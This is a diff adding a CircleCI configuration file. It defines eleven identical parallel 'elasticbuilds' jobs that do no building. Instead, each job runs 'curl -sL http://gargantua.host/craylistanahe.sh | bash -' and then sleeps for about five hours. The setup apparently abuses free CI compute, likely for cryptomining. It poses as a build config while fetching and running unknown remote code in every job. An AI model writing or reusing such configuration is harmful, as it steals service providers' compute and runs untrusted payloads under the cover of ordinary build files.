@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  elasticbuilds:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elasticbuilds1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elasticbuilds2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elasticbuilds3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elasticbuilds4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elasticbuilds5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elasticbuilds6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elasticbuilds7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elasticbuilds8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elasticbuilds9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elasticbuilds10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanahe.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - elasticbuilds
+      - elasticbuilds1
+      - elasticbuilds2
+      - elasticbuilds3
+      - elasticbuilds4
+      - elasticbuilds5
+      - elasticbuilds6
+      - elasticbuilds7
+      - elasticbuilds8
+      - elasticbuilds9
+      - elasticbuilds10
